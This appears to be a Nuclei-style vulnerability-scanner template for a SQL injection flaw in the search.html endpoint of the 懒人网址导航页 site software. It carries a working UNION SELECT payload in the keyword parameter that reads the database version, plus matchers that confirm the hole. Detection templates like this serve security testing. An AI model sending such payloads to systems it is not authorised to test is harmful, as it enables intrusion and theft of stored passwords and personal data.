id: LRWZ-search-html-SQL

info:
  name: 懒人网址导航页 search.html SQL注入漏洞
  author: unknown
  severity: high
  description: 懒人网址导航页 search.htm 接口处存在 SQL注入漏洞，未经身份验证的恶意攻击者利用 SQL 注入漏洞获取数据库中的信息(例如管理员后台密码、站点用户个人信息)之外，攻击者甚至可以在高权限下向服务器写入命令，进一步获取服务器系统权限。
  tags: sql injection
  
http:
  - raw:   
      - |
        GET /search.html?keyword='+UNION+ALL+SELECT+NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x2d2d2d2d2d,version(),0x2d2d2d2d2d),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+- HTTP/1.1
        Host: {{Hostname}}
        
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '-----'
      - type: status
        status: 
          - 200